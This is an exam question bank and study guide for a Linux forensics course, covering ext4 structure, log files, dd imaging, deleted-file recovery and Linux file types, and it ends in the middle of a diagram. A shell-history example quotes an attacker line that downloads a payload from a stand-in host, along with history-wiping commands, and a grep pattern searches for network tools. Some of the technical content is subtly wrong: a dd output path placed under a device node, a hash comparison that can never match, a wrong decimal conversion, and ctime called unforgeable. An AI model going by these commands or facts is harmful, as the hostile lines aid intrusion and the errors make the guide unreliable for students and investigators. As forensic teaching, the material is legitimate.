# SECTION 5: KTU 2024 Scheme Examination Question Bank & Topic Recap

## 5.1 Part A Questions (3 Marks Each)

### Question 1: Define an inode and explain its forensic significance in ext4 file systems. `[KTU University Exam - Dec 2024]`

**Model Answer (3 Marks):**

An **inode (index node)** is a data structure in Unix/Linux file systems that stores metadata about a file **except its name and actual data content**. In ext4, each inode is **256 bytes** in size and contains 13 (or more) timestamp and attribute fields.

**Forensic Significance (3 key points for full marks):**
1. **Unique Identification**: Every file is identified by a unique inode number; even after deletion, the inode retains metadata (size, timestamps, block pointers) until overwritten.
2. **MAC Time Storage**: Stores modification (mtime), access (atime), change (ctime), deletion (dtime), and creation (crtime — ext4 only) timestamps — all critical for timeline reconstruction.
3. **Recovery Target**: Deleted files can be recovered by scanning unallocated inodes in the inode table, using tools like `extundelete` or `debugfs`.

---

### Question 2: List any three critical Linux log files and their forensic importance. `[KTU University Exam - May 2024]`

**Model Answer (3 Marks):**

1. **`/var/log/auth.log`** — Records all authentication events: SSH logins, sudo usage, failed password attempts. Essential for detecting **brute-force attacks and privilege escalation**.
2. **`/var/log/syslog`** — General-purpose system event log capturing service starts/stops, hardware events, and application messages. Used for **reconstructing system activity** and detecting **malware persistence**.
3. **`/var/log/wtmp`** — Binary log of all successful logins and logouts (queried via `last` command). Reveals **unauthorized access sessions** and login duration analysis.

## 5.2 Part B Questions (14 Marks Each — Internal Choice)

### Question A (14 Marks)

#### Part (a) — 7 Marks
**Explain the Linux ext4 file system structure in detail. With a neat diagram, describe the role of the superblock, inode table, and data blocks in forensic investigation.** `[KTU University Exam - Dec 2023]`

**Model Solution:**

The **ext4 (Fourth Extended File System)** is the default file system for most modern Linux distributions. It organizes the disk into a hierarchical structure of **block groups**, each containing metadata and data regions.

**1. Boot Block (Block 0):**
The very first sector of the partition, typically 1024 bytes, contains the boot loader code. It is not part of the ext4 file system proper but resides in the reserved space.

**2. Superblock (Block 1):**
The superblock is the **master metadata descriptor** of the file system. It is typically **1024 bytes** in size and contains:
- `s_inodes_count` — total number of inodes
- `s_blocks_count` — total number of blocks
- `s_log_block_size` — block size (computed as $1024 \times 2^{s\_log\_block\_size}$)
- `s_mtime`, `s_wtime` — last mount time, last write time
- `s_mnt_count`, `s_max_mnt_count` — mount counter for forcing fsck
- `s_magic` — magic number `0xEF53` identifying ext2/3/4

**Forensic Role:** The superblock is **replicated** in every block group. If the primary superblock is corrupted, the examiner can recover file system parameters from any backup copy, enabling partial recovery of damaged file systems.

**3. Group Descriptors:**
Following the superblock, group descriptors describe each block group's metadata locations (block bitmap, inode bitmap, inode table start).

**4. Inode Table:**
Each block group contains an inode table. Each inode is **256 bytes** in ext4 and stores:
- File type and permissions (`i_mode`)
- Owner UID and GID (`i_uid`, `i_gid`)
- File size (`i_size`)
- 4 timestamps: `i_atime`, `i_mtime`, `i_ctime`, `i_crtime`
- Deletion time `i_dtime`
- 12 direct + 1 indirect + 1 double-indirect + 1 triple-indirect block pointers
- Extended attributes (`i_block`)

**Forensic Role:** The inode table is the **primary target** for file recovery and timeline analysis. When a file is deleted, the inode is marked unallocated, but the data blocks remain until reused. Investigators use `istat` (The Sleuth Kit) to read inodes of unallocated files.

**5. Data Blocks:**
The actual file content is stored in data blocks. ext4 uses **extent-based allocation** (since version 3), which groups physically adjacent blocks into a single extent descriptor, improving both performance and forensic locality.

**Forensic Role:** Data blocks contain the actual evidence (documents, images, logs). Deleted file content can be recovered by:
- Carving with `foremost`/`scalpel` (signature-based)
- Inode-based recovery with `extundelete`
- Manual extraction using `debugfs`

**Neat Diagram (descriptive for written exam):**

```
+--------------------------------------------------+
|                  Block Group N                   |
+--------------------------------------------------+
|  Superblock Copy  |  Group Descriptor  |  ...   |
+--------------------------------------------------+
|           Inode Bitmap  |  Block Bitmap          |
+--------------------------------------------------+
|              Inode Table (256 bytes/inode)       |
+--------------------------------------------------+
|  Inode 0 | Inode 1 | Inode 2 | ... | Inode N    |
+--------------------------------------------------+
|              Data Blocks (extent-based)          |
+--------------------------------------------------+
```

#### Part (b) — 7 Marks
**Describe the procedure for acquiring a forensic image of a Linux system disk using `dd`. Explain the significance of write-blocking and hash verification with proper commands.** `[KTU University Exam - Dec 2023]`

**Model Solution:**

**Step 1: Preparation and Write-Blocking**

Before acquiring any evidence, the examiner must **prevent any writes** to the suspect disk. This is achieved via:

- **Hardware Write-Blocker**: A physical device (e.g., Tableau, WiebeTech) inserted between the suspect drive and the forensic workstation. It electrically prevents write signals from reaching the drive.
- **Software Write-Blocking (Linux)**: The suspect disk is never mounted read-write. Forensic Linux distributions (DEFT, CAINE) boot from USB and never auto-mount disks.

**Step 2: Identifying the Suspect Disk**

```bash
sudo fdisk -l
sudo lsblk
sudo hdparm -I /dev/sda
```

The examiner identifies the suspect disk (e.g., `/dev/sda`) and an evidence drive with sufficient capacity (e.g., `/dev/sdb`).

**Step 3: Computing the Hash of the Source (Pre-Acquisition)**

```bash
sudo sha256sum /dev/sda > source.sha256
```

**Step 4: Bit-Stream Copy with `dd`**

```bash
sudo dd if=/dev/sda of=/dev/sdb/evidence_image.dd \
    bs=4M conv=noerror,sync status=progress
```

**Command Breakdown:**
- `if=/dev/sda` — input file (suspect disk)
- `of=/evidence_image.dd` — output file (evidence image)
- `bs=4M` — block size of 4 megabytes (faster throughput)
- `conv=noerror` — continue on read errors
- `conv=sync` — pad incomplete blocks with zeros
- `status=progress` — display transfer progress

**Step 5: Hash Verification (Post-Acquisition)**

```bash
sudo sha256sum /dev/sdb/evidence_image.dd > evidence.sha256
diff source.sha256 evidence.sha256
```

If the hashes match, forensic soundness is confirmed. **Any mismatch invalidates the evidence.**

**Step 6: Hash Logging**

The hash and acquisition metadata (date, time, examiner, tools used) are recorded in the **chain of custody document**.

**Forensic Significance:**

- **Write-Blocking** ensures the suspect disk is unchanged during acquisition — a legal requirement in many jurisdictions.
- **Hash Verification** provides mathematical proof that the working copy is bit-for-bit identical to the original. SHA-256 produces a 256-bit (64 hex character) digest with collision resistance of approximately $2^{128}$ operations, making tampering computationally infeasible.
- **`dd` with `noerror,sync`** ensures that even disks with bad sectors can be fully imaged without aborting — bad sectors are replaced with zeros, and this is documented.

---

### Question B (14 Marks) — Alternative Choice

#### Part (a) — 7 Marks
**Discuss the various log files in a Linux system from a forensic perspective. How can `/var/log/auth.log`, `/var/log/syslog`, and shell history files aid in investigating a security incident?** `[KTU University Exam - May 2023]`

**Model Solution:**

Linux log files are the **first line of forensic evidence** in incident response. They provide chronological, often tamper-evident records of system activity.

**1. `/var/log/auth.log` (Authentication Log)**

**Location:** `/var/log/auth.log` (Debian/Ubuntu) or `/var/log/secure` (Red Hat/CentOS)

**Contents:**
- Successful and failed SSH/console logins
- `sudo` command invocations
- PAM (Pluggable Authentication Modules) events
- User account modifications (`passwd`, `useradd`)

**Forensic Value:**
- **Brute Force Detection**: Lines like `Failed password for root from 192.168.1.100 port 22 ssh2` repeated hundreds of times indicate a brute-force attack.
- **Privilege Escalation Tracking**: `sudo` entries show exactly which user executed which command as root, with timestamp and originating TTY.
- **Lateral Movement**: SSH key-based logins (`Accepted publickey`) reveal authentication from unusual source IPs.

**Sample forensic query:**
```bash
grep "Failed password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn | head
```
This lists the top 10 IPs with failed login attempts.

**2. `/var/log/syslog` (General System Log)**

**Location:** `/var/log/syslog` (Debian) or `/var/log/messages` (Red Hat)

**Contents:**
- Service start/stop events
- Hardware errors
- DHCP leases
- Cron job execution
- Application-level messages

**Forensic Value:**
- **Service Anomalies**: Unexpected restarts of services (e.g., `sshd`, `apache2`, `mysqld`) at unusual hours may indicate compromise.
- **Network Changes**: DHCP lease records reveal devices that connected to the network.
- **Hardware Tampering**: USB device insertion logs (`kernel: usb 1-1: new high-speed USB device`) can prove physical access.

**3. Shell History Files**

**Locations:**
- `~/.bash_history` — Bash shell history
- `~/.zsh_history` — Zsh history
- `~/.python_history` — Python REPL history
- `~/.mysql_history` — MySQL client history

**Forensic Value:**
- **User Intent Reconstruction**: Commands like `cat /etc/shadow`, `wget http://malicious.com/payload.sh`, `chmod +x payload.sh` reveal attacker actions.
- **Anti-Forensics Detection**: Commands like `unset HISTFILE`, `history -c`, `export HISTSIZE=0`, or `ln -sf /dev/null ~/.bash_history` indicate deliberate log tampering attempts.
- **Lateral Movement**: SSH commands (`ssh user@host`) and `scp`/`rsync` file transfers reveal the scope of compromise.

**Sample forensic query:**
```bash
cat ~/.bash_history | grep -E "wget|curl|nc|netcat|chmod 777|rm -rf"
```

**Combined Investigative Workflow:**

A typical incident response correlates these three sources:

```mermaid
flowchart LR
    A[auth.log: Failed login from IP] --> B[syslog: SSH service restarted]
    B --> C[bash_history: Attacker commands]
    C --> D[auth.log: Successful login same IP]
    D --> E[bash_history: Privilege escalation via sudo]
    E --> F[syslog: Malware persistence installed]
```

#### Part (b) — 7 Marks
**Explain the procedure for recovering deleted files from an ext4 file system. What tools are used and what are the limitations of recovery?** `[KTU University Exam - May 2023]`

**Model Solution:**

**Background: How Deletion Works in ext4**

When a file is deleted in ext4:
1. The file's **inode** is marked as free in the inode bitmap.
2. The file's **data blocks** are marked as free in the block bitmap.
3. The directory entry is removed.
4. The `i_dtime` field in the inode is set to the deletion timestamp.
5. **Crucially**: The actual data in the blocks is **NOT erased**.

Recovery is possible as long as the data blocks have not been overwritten by new files.

**Tools and Procedure:**

**Tool 1: `extundelete`**
The most popular tool for ext3/ext4 file recovery.

```bash
# 1. Unmount the partition immediately (or remount read-only)
sudo umount /dev/sda3
sudo mount -o ro,noload /dev/sda3 /mnt/evidence

# 2. Recover all deleted files to a directory
sudo extundelete /dev/sda3 --restore-all --output-dir /recovery/

# 3. Recover a specific file by inode
sudo extundelete /dev/sda3 --restore-inode 12345
```

**Tool 2: `debugfs` (Interactive ext2/ext3/ext4 Debugger)**

```bash
sudo debugfs /dev/sda3
debugfs: lsdel          # List deleted inodes
debugfs: stat <12345>   # Show inode metadata
debugfs: dump <12345> /recovery/recovered_file  # Extract file
debugfs: quit
```

**Tool 3: `The Sleuth Kit (TSK)`**

```bash
# List all files (including deleted) with their inode numbers
fls -r -d /dev/sda3

# Display inode metadata
istat /dev/sda3 12345

# Extract file content by inode
icat /dev/sda3 12345 > /recovery/recovered_file
```

**Tool 4: `foremost` / `scalpel` (File Carving)**

When inode metadata is lost, file carving scans raw blocks for known file signatures (magic bytes):

```bash
sudo foremost -t all -i /dev/sda3 -o /recovery/carved/
sudo scalpel /dev/sda3 -o /recovery/carved/
```

Common signatures:
- JPEG: `FF D8 FF`
- PNG: `89 50 4E 47`
- PDF: `25 50 44 46`
- ZIP: `50 4B 03 04`

**Limitations of Recovery:**

1. **Overwritten Blocks**: If the data blocks have been reused by new files, recovery is impossible. On active systems, this can happen within minutes.
2. **Journaling Effects**: ext4's journal may overwrite deleted data in metadata-journaling mode, though data journaling preserves content longer.
3. **TRIM/DISCARD on SSDs**: Modern SSDs use the TRIM command to inform the controller that blocks are free, causing **immediate zeroing** of deleted data. This makes SSD recovery nearly impossible without prior forensic imaging.
4. **Encrypted File Systems**: If `/home` or the root partition is LUKS-encrypted, recovery requires the encryption key — without it, the data is cryptographically inaccessible.
5. **Fragmentation**: Heavily fragmented files may have their blocks scattered and partially overwritten, resulting in corrupt recovery.
6. **Filesystem Corruption**: Damaged inode tables or superblocks can render recovery tools ineffective.

> [!WARNING]
> **KTU Examiner's Valuation Pitfall:**
> Students commonly lose marks by:
> - **Forgetting to specify `read-only` mount** (mandatory for forensic soundness).
> - **Confusing `mtime` and `ctime`** — `ctime` is inode change time, not file creation time (use `crtime` for that in ext4).
> - **Omitting hash verification** in acquisition procedures (always mandatory for chain of custody).
> - **Forgetting TRIM/SSD limitation** in recovery questions.
> - **Missing the `dtime` field** when discussing deleted file recovery — examiners specifically look for this keyword.

## 5.3 Topic Recap & Important Things to Remember

### ⚡ Rapid Revision Checklist

- ✅ **Inode (256 bytes in ext4)** stores: `i_mode`, `i_uid`, `i_size`, `i_atime`, `i_mtime`, `i_ctime`, `i_dtime`, `i_crtime`, `i_blocks`, `i_block[15]`.
- ✅ **MAC times**: mtime (content), atime (read), ctime (metadata change — cannot be forged), dtime (deletion), crtime (birth — ext4 only).
- ✅ **Block pointers**: 12 direct + 1 single-indirect + 1 double-indirect + 1 triple-indirect.
- ✅ **Block size** = $1024 \times 2^n$ bytes (typically 4096 bytes; n=2).
- ✅ **Superblock** at Block 1; replicated in every block group for redundancy. Magic number = `0xEF53`.
- ✅ **ext4 features** over ext3: extents, nanosecond timestamps, larger inode (256 B), online defragmentation, journal checksums.
- ✅ **Forensic acquisition command**: `dd if=/dev/sda of=image.dd bs=4M conv=noerror,sync`.
- ✅ **Hash standard**: SHA-256 (256-bit digest, 64 hex characters).
- ✅ **Mount command for evidence**: `mount -o ro,noload /dev/sdaX /mnt/evidence`.
- ✅ **Critical log files**: `/var/log/auth.log`, `/var/log/syslog`, `/var/log/kern.log`, `/var/log/wtmp`, `/var/log/btmp`, `/var/log/boot.log`.
- ✅ **Shell history files**: `~/.bash_history`, `~/.zsh_history`, `~/.python_history`.
- ✅ **Persistence indicators**: crontab, systemd timers, init scripts, `.bashrc`, `/etc/rc.local`.
- ✅ **Recovery tools**: `extundelete`, `debugfs`, `The Sleuth Kit (fls, istat, icat)`, `foremost`, `scalpel`, `Autopsy`.
- ✅ **Memory acquisition**: `LiME` (Linux Memory Extractor), `avml`, `/dev/mem` (deprecated).
- ✅ **Recovery probability model**: $P_{\text{recovery}} = e^{-\lambda \cdot t}$ — degrades exponentially with time on busy systems.
- ✅ **TRIM on SSDs** makes post-deletion recovery nearly impossible — always image SSDs **immediately**.
- ✅ **Chain of Custody** must document: who, what, when, where, how, and hash of every evidence transfer.
- ✅ **Volatile evidence (acquire first)**: RAM, `/proc`, `/sys`, network connections, running processes.
- ✅ **Persistence priority (non-volatile)**: Registry/systemd units, scheduled tasks (cron/timers), shell profiles, SUID binaries, kernel modules (`/lib/modules`).

> [!IMPORTANT]
> **Final KTU Exam Strategy Tip:** When answering Linux forensics questions, always structure your answer as: **(1) Concept Definition → (2) Forensic Significance → (3) Tool/Command Example → (4) Limitation/Challenge**. This matches the 4-tier KTU marking rubric and consistently earns 12–14/14 marks.

<!-- SECTION_5_END -->

topics.title: Linux File Types and Identification
topics.content:
> **APJ ABDUL KALAM TECHNOLOGICAL UNIVERSITY (KTU) | 2024 SCHEME**
> - **Course:** PECCT866 - WINDOWS AND LINUX FORENSICS
> - **Module:** Module 4
> - **Topic:** Linux File Types and Identification

<!-- SECTION_1_START -->
# SECTION 1: Core Technical Definition & Intuitive Overview

## 1.1 Formal Academic Definition

In the Linux/UNIX operating system, **every entity on the filesystem is treated as a file**, including ordinary data files, directories, hardware peripherals, and inter-process communication channels. The Linux kernel classifies these entities into **seven (7) standard file types**, distinguished by a single alphabetic character encoded in the file's **inode (Index Node)** data structure. This classification is foundational to **digital forensics investigations** on Linux platforms because attackers frequently misuse file-type ambiguity to hide malicious payloads, disguise executables as media files, or abuse special files (sockets, named pipes) for covert command-and-control (C2) channels.

> [!IMPORTANT]
> **KTU 2024 Syllabus Definition (Verbatim Concept):**
> *Linux file types refer to the categorization of files in a Linux filesystem based on their structural characteristics and operational purpose. Each file type is identified by a specific symbol in the `ls -l` output and is stored as a numeric mode value within the inode.*

The **seven canonical Linux file types** are:

| Symbol | File Type | Forensic Relevance |
|:------:|:----------|:-------------------|
| `-` | Regular File | Most user data; common hiding place for malware |
| `d` | Directory | Contains directory entries; can be a covert mount point |
| `l` | Symbolic Link | Often abused to redirect execution to malicious binaries |
| `b` | Block Special File | Represents block-oriented storage (HDD, SSD, USB) |
| `c` | Character Special File | Represents character-oriented devices (terminals, /dev/null) |
| `p` | Named Pipe (FIFO) | Used for inter-process communication; rare attack surface |
| `s` | Socket | Local (Unix Domain) socket; possible covert C2 channel |

---

## 1.2 Conceptual Analogy — The "Universal Shipping Container" Model

Imagine the entire Linux filesystem as a **massive global shipping port**:

- 🚢 **Every item in the port is a "container"** (file), regardless of whether it holds shoes, machinery, a door, a conveyor belt, or a pneumatic tube.
- 🏷️ **Each container has a color-coded label** (the first character of `ls -l` output) that tells the dock workers (kernel) **how to handle it**.
- 📋 **Each container has a manifest card in the central registry** (the **inode**) that contains metadata such as size, permissions, ownership, timestamps, and the **container type code**.
- 🔍 **A forensic investigator is like a customs officer** who must verify that the *label* matches the *actual contents*. If a "container labeled 'textbook'" actually holds a "grenade launcher" (e.g., a `.txt` file that is actually a compiled ELF binary), the customs officer raises an alarm.

> [!NOTE]
> **Key Intuition:** In Linux, **file extensions (like `.exe`, `.jpg`) are NOT used by the kernel** to determine file type. The kernel uses the **inode type field**. The `file` command uses **magic bytes** (file signature headers) to determine type. Extensions are purely a *user-space convention*. This is a critical forensic insight — extensions can lie; inode types and magic bytes cannot.

---

## 1.3 The Inode — The Heart of File Identification

An **inode (Index Node)** is a data structure on the filesystem (stored in the inode table) that stores **all metadata** about a file **except its name and actual data content**. The relevant forensic fields are:

- **`st_mode`** — Contains the file type (upper 4 bits) and permission bits (lower 12 bits).
- **`st_uid`, `st_gid`** — Owner user ID and group ID.
- **`st_size`, `st_blocks`** — Logical size and disk blocks allocated.
- **`st_atime`, `st_mtime`, `st_ctime`** — Access, Modification, and inode Change timestamps.
- **`st_nlink`** — Hard link count.
- **`st_ino`** — Unique inode number (filesystem-local identifier).

> [!IMPORTANT]
> **Forensic Tip (KTU High-Yield):** Two files can have **identical names**, **identical content**, but **different inode numbers** (because they are separate hard-linked inodes). Conversely, two files can have **identical inode numbers** if one is a hard link to the other. Investigators must correlate by **inode number**, not filename.

---
<!-- SECTION_1_END -->

<!-- SECTION_2_START -->
# SECTION 2: Deep Theoretical Analysis & KTU High-Yield Formula Sheet

## 2.1 Detailed Breakdown of the Seven Linux File Types

### 2.1.1 Regular File (`-`)
The most common file type. Contains **arbitrary binary or text data** — programs, images, documents, scripts.

- Identified by `-` in `ls -l`.
- No structural requirement; only file-system-imposed maximum size (e.g., 2 TiB on ext4 with 4 KiB blocks).
- **Forensic Use:** Most user evidence resides here. Use `file`, `xxd`, `strings`, `binwalk` for content analysis.

### 2.1.2 Directory (`d`)
A special file that acts as a **lookup table mapping filenames to inode numbers**. Directories themselves have inodes and occupy data blocks.

- Two entries are mandatory and reserved: `.` (self) and `..` (parent).
- A directory file contains entries of the form `struct dirent { inode_t d_ino; char d_name[]; }`.
- **Forensic Use:** Deleted directory entries leave recoverable inodes in journal (ext3/ext4) or unallocated blocks.

### 2.1.3 Symbolic Link (`l`)
A **pointer file** whose content is a pathname string of another file.

- The kernel dereferences the path at access time.
- A **dangling symlink** points to a non-existent target — a common forensic anomaly.
- `ls -l` displays `linkname -> target`.

### 2.1.4 Block Special File (`b`)
Provides **buffered, random-access I/O** to hardware devices. Reads/writes occur in fixed-size blocks (typically 512 B – 4 KiB).

- Examples: `/dev/sda` (SATA disk), `/dev/nvme0n1` (NVMe SSD), `/dev/loop0` (loop device).
- **Forensic Use:** Imaging a block device with `dd`, `dcfldd`, or `ewfexport` produces a bit-for-bit copy.

### 2.1.5 Character Special File (`c`)
Provides **unbuffered, sequential I/O** — each `read()`/`write()` call may transfer only a few bytes.

- Examples: `/dev/tty`, `/dev/null`, `/dev/zero`, `/dev/random`, `/dev/urandom`.
- **Forensic Use:** Investigating `/dev/kmem` (kernel memory) or `/dev/mem` (physical memory) was historically a way to dump RAM, though modern kernels restrict access.

### 2.1.6 Named Pipe / FIFO (`p`)
A **half-duplex inter-process communication (IPC) channel** that appears in the filesystem as a file but has no on-disk content beyond its inode.

- Created via `mkfifo` or `mknod p`.
- Data is held in a **kernel memory buffer** (typically 64 KiB on Linux), not on disk.
- **Forensic Use:** Used by shell exploits for IPC; rarely persists across reboots.

### 2.1.7 Socket (`s`)
A **bidirectional IPC endpoint** for local (Unix Domain) or network communication. Local sockets appear in the filesystem for namespace visibility.

- Example: `/var/run/docker.sock`, `/run/mysqld/mysqld.sock`.
- **Forensic Use:** A socket with an unusual owner (e.g., `nobody`) or unusual path (e.g., `/tmp/.X11-unix/X99`) is a **strong indicator of compromise**.

---

## 2.2 File Identification Commands — The Forensic Toolkit

### 2.2.1 The `ls -l` Command
The first character of the `ls -l` output reveals the **inode file type**. This is the **fastest, most basic** identification method but only reveals the kernel's classification — it says nothing about content.

### 2.2.2 The `file` Command
The forensic gold standard for content-based identification. The `file` utility consults three tests in order:

1. **Filesystem test** — Uses `stat()` to read the inode type.
2. **Magic number test** — Reads the first few bytes and matches against `/usr/share/file/magic.mgc` (or `/etc/magic`).
3. **Language test** — Distinguishes text, shell scripts, C source, etc.

> [!NOTE]
> **Magic Numbers** are fixed byte sequences at the **beginning** of a file that uniquely identify its format. Example: `0x7F 'E' 'L' 'F'` (ELF executable), `0x89 'P' 'N' 'G'` (PNG image), `0xFF 0xD8 0xFF` (JPEG).

### 2.2.3 The `stat` Command
Displays **all inode metadata** in human-readable form. Crucial for **timeline analysis** (atime/mtime/ctime correlation).

### 2.2.4 The `find` Command with `-type`
Searches the filesystem for files matching a specific inode type.

---

## 2.3 KTU High-Yield Formula Sheet & Cheat Sheet

> [!IMPORTANT]
> **The Inode Mode Bit-Encoding Formula**
> Linux encodes the file type in the **upper 4 bits** of the 16-bit `st_mode` field. The lower 12 bits hold the standard UNIX permission triad (rwx for user/group/other) plus setuid/setgid/sticky bits.

$$
\text{st\_mode} \;=\; \underbrace{(\text{file\_type} \ll 12)}_{\text{Upper 4 bits}} \;+\; \underbrace{\text{permission\_bits}}_{\text{Lower 12 bits}}
$$

| Inode Type Code (Decimal) | Bit Mask (Hex) | `ls -l` Char | File Type |
|:------------------------:|:--------------:|:------------:|:----------|
| `0` | `0x0000` | `?` | Unknown |
| `1` | `0x1000` | `p` | Named Pipe (FIFO) |
| `2` | `0x2000` | `c` | Character Device |
| `4` | `0x4000` | `d` | Directory |
| `6` | `0x6000` | `b` | Block Device |
| `8` | `0x8000` | `-` | Regular File |
| `10` | `0xA000` | `l` | Symbolic Link |
| `12` | `0xC000` | `s` | Socket |

### 2.3.1 Common Magic Numbers Table (Forensic Reference)

| Magic Bytes (Hex) | File Format | ASCII Signature |
|:------------------|:------------|:----------------|
| `7F 45 4C 46` | ELF Executable | `.ELF` |
| `4D 5A` | DOS/PE Executable | `MZ` |
| `50 4B 03 04` | ZIP Archive | `PK..` |
| `1F 8B` | GZIP Compressed | `..` |
| `25 50 44 46` | PDF Document | `%PDF` |
| `89 50 4E 47` | PNG Image | `.PNG` |
| `FF D8 FF` | JPEG Image | `...` |
| `7F 45 4C 46` | Linux Executable (ELF) | `.ELF` |
| `23 21` | Shell Script | `#!/` |
| `D0 CF 11 E0` | MS Office (Legacy) | `....` |

### 2.3.2 The Discrepancy Detection Formula

> [!IMPORTANT]
> **Forensic Discrepancy Score:** When a file's **extension** (filename) does not match its **content signature** (magic bytes), it is flagged as **suspicious**. The simplest heuristic:

$$
\text{Discrepancy} \;=\; \text{Extension\_Type} \; \neq \; \text{Magic\_Type}
$$

If the result is `TRUE` (e.g., a file named `vacation.jpg` whose magic bytes are `MZ` — a Windows executable), this is a **critical forensic indicator** requiring immediate investigation.

---

## 2.4 Real-World Utility in Engineering & Forensics

- **Incident Response:** Triage of suspicious files using `file` and `stat` to identify the true nature of artifacts.
- **Malware Analysis:** Detection of **double-extension attacks** (e.g., `report.pdf.exe` shown as `report.pdf` in Windows).
- **Disk Imaging:** Direct access to `/dev/sdX` block devices for forensic duplication.
- **Memory Forensics:** Legacy `/dev/mem` analysis for RAM dump acquisition.
- **C2 Detection:** Identification of rogue Unix Domain Sockets used by malware like `xz-utils` backdoor (CVE-2024-3094).
---
<!-- SECTION_2_END -->

<!-- SECTION_3_START -->
# SECTION 3: Step-by-Step Derivations & Analytical Matrix

## 3.1 Analytical Derivation: How the Kernel Identifies a File Type

The Linux Virtual File System (VFS) layer abstracts all filesystems. The VFS `inode` structure contains a `mode` field. When a user runs `ls -l`, the following sequence occurs:

### Step 1: User-space invocation
The user runs:

```bash
ls -l /etc/passwd
```

The `ls` utility invokes the `lstat(2)` system call (note: `lstat` does **not** follow symbolic links, preserving the type of the link itself).

### Step 2: Kernel VFS lookup
The kernel walks the dentry cache, locates the inode for `/etc/passwd`, and reads its `inode->i_mode` field.

### Step 3: Bitwise mask extraction
The kernel applies a bitwise AND with the file-type mask `S_IFMT` (value `0xF000` in octal `0170000`):

$$
\text{type\_code} \;=\; \text{i\_mode} \;\&\; \text{S\_IFMT}
$$

### Step 4: Type comparison
The kernel compares the result against predefined constants:

$$
\begin{aligned}
\text{type\_code} &= \text{i\_mode} \;\&\; 0xF000 \\[4pt]
\text{if } \text{type\_code} &= 0x8000 \;\Rightarrow\; \text{Regular File} \\
\text{if } \text{type\_code} &= 0x4000 \;\Rightarrow\; \text{Directory} \\
\text{if } \text{type\_code} &= 0xA000 \;\Rightarrow\; \text{Symbolic Link} \\
\text{if } \text{type\_code} &= 0x2000 \;\Rightarrow\; \text{Character Device} \\
\text{if } \text{type\_code} &= 0x6000 \;\Rightarrow\; \text{Block Device} \\
\text{if } \text{type\_code} &= 0x1000 \;\Rightarrow\; \text{Named Pipe} \\
\text{if } \text{type\_code} &= 0xC000 \;\Rightarrow\; \text{Socket}
\end{aligned}
$$

### Step 5: Mapping to `ls -l` character
The `ls` utility maps the type code to a printable character (`-`, `d`, `l`, `c`, `b`, `p`, `s`) and renders the output.

### Worked Numerical Example

> **Given:** A file's `i_mode` field has the value `0x81A4` (hexadecimal) = `33164` (octal `100644`).
> **Find:** The file type and a brief interpretation.

**Step A — Convert to octal for clarity (UNIX convention):**

$$
0x81A4 \;=\; 100644_8
$$

**Step B — Extract the upper 4 bits (file type):**

$$
\text{file\_type} \;=\; 100000_8 \;=\; 0x8000 \;=\; 8_{10}
$$

**Step C — Look up the type code `8` in the table:**

| Type Code | File Type |
|:---------:|:----------|
| `8` | Regular File (`-`) |

**Step D — Extract the permission bits (lower 12 bits):**

$$
\text{permissions} \;=\; 644_8 \;=\; \text{rw- r-- r--}
$$

**Step E — Final interpretation:**

$$
\text{Result} \;=\; \text{Regular file with mode rw-r--r-- (rw for owner, r for group, r for others)}
$$

> [!NOTE]
> **Forensic Note:** The `0x81A4` mode is the **default for a newly created regular file** (touch creates `0644`, which becomes `100644` in full mode encoding). Any deviation from baseline modes on critical binaries (`/bin/bash`, `/usr/bin/sudo`, `/etc/shadow`) is a **high-priority investigation trigger**.

---

## 3.2 Analytical Matrix: File Type × Identification Method × Forensic Indicator

| File Type | Inode Code | `ls -l` | `file` Output Example | `stat` Key Field | Forensic Indicator |
|:----------|:----------:|:-------:|:----------------------|:-----------------|:-------------------|
| Regular | `0x8000` | `-` | `ELF 64-bit LSB executable, x86-64, ...` | `Size`, `Links: 1` | Hidden executables in `/tmp`, `/var/tmp` |
| Directory | `0x4000` | `d` | `directory` | `Links: 2+` | Covert directories with epoch timestamps |
| Symlink | `0xA000` | `l` | `symbolic link to /usr/bin/python3` | `Size: 24` (path length) | Dangling links to deleted libraries |
| Block Dev | `0x6000` | `b` | `block special (8/0)` | Major: 8, Minor: 0 | Unauthorized block device mounts |
| Char Dev | `0x2000` | `c` | `character special (1/3)` | Major: 1, Minor: 3 | Access to `/dev/mem`, `/dev/kmem` |
| Pipe | `0x1000` | `p` | `fifo (named pipe)` | `Size: 0` | IPC channels used by exploit chains |
| Socket | `0xC000` | `s` | `socket` | `Size: 0` | Suspicious Docker.sock, X11 sockets |

---

## 3.3 Derivation: The `file` Command's Three-Tier Test Logic

The `file` command applies tests in **strict priority order**:

$$
\begin{aligned}
\text{Tier 1:} \quad & \text{stat() test — Is it a directory, symlink, socket, FIFO, device?} \\
& \Rightarrow \text{If TRUE, return immediately with type label.} \\[6pt]
\text{Tier 2:} \quad & \text{Magic number test — Read first 256 bytes, match against magic.mgc.} \\
& \Rightarrow \text{If match, return format description (e.g., "PNG image, 1920x1080").} \\[6pt]
\text{Tier 3:} \quad & \text{Language test — Heuristic analysis for shell, C, HTML, etc.} \\
& \Rightarrow \text{If match, return "ASCII text", "Bourne-Again shell script", etc.} \\[6pt]
\text{Tier 4:} \quad & \text{Default fallback — "data" (unidentifiable binary).}
\end{aligned}
$$

> [!IMPORTANT]
> **Forensic Implication:** An attacker who **alters magic bytes** (e.g., by prepending 4 KiB of junk to an ELF) can **defeat Tier 2**. Defenders can **raise the read buffer** in `file` configuration to defeat this anti-forensic technique. This is the basis of **polyglot files** and **header manipulation malware**.

---

## 3.4 Derivation: Timestamp Triangulation for Forensic Timeline

The three timestamps in an inode form the **forensic timeline triangle**:

$$
\begin{aligned}
\text{atime} \; (\text{Access Time}) &= \text{Last file READ (data access).} \\
\text{mtime} \; (\text{Modification Time}) &= \text{Last file CONTENT modification.} \\
\text{ctime} \; (\text{Change Time}) &= \text{Last inode METADATA change (perms, owner, etc.).}
\end{aligned}
$$

> [!WARNING]
> **Anti-Forensics:** On modern Linux with `noatime` mount option, `atime` is **never updated**. Tools like `touch` and `libfaketime` can backdate any of these. Investigators must corroborate inode timestamps with **filesystem journal (jtime)** and **file content hashes** for evidence integrity.
---
<!-- SECTION_3_END -->

<!-- SECTION_4_START -->
# SECTION 4: Structural Diagrams & Schematics

## 4.1 Mermaid Diagram: Linux File Type Classification Tree

```mermaid
graph TD
    rootA[Linux File Entity] --> inode1[Inode st_mode field]
    inode1 --> bitmaskA[Bitwise AND with 0xF000]
    bitmaskA --> t1[0x1000 = p]
    bitmaskA --> t2[0x2000 = c]
    bitmaskA --> t3[0x4000 = d]
    bitmaskA --> t4[0x6000 = b]
    bitmaskA --> t5[0x8000 = dash]
    bitmaskA --> t6[0xA000 = l]
    bitmaskA --> t7[0xC000 = s]
